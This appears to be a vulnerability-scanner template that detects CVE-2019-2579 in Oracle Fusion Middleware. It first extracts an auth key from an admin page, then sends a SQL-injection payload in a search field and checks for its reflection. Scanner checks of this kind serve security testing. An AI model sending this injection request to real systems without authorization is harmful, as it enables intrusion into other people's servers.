id:
name: CVE-2019-2579
transport: http
tags:
  -  Oracle-Fusion-Middleware
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences
      follow_redirects: true
    expression: response.status==200
    output:
      authkey: r"NAME='_authkey_' VALUE='([0-9A-Z]+)'>".bsubmatch(response.body)['1']
  r1:
    request:
      cache: true
      method: POST
      path: /cs/ContentServer
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: |
        _authkey_={{authkey}}&pagename=OpenMarket%2FXcelerate%2FAdmin%2FWebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=%27+and+%271%27%3D%270+--+
      follow_redirects: true
    expression: response.status==200 &&
                response.body.bcontains(b"value='&#39; and &#39;1&#39;=&#39;0 --") &&
                response.body.bcontains(b'Use this utility to view and manage URLs')
expression: r0() && r1()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2019-2579漏洞"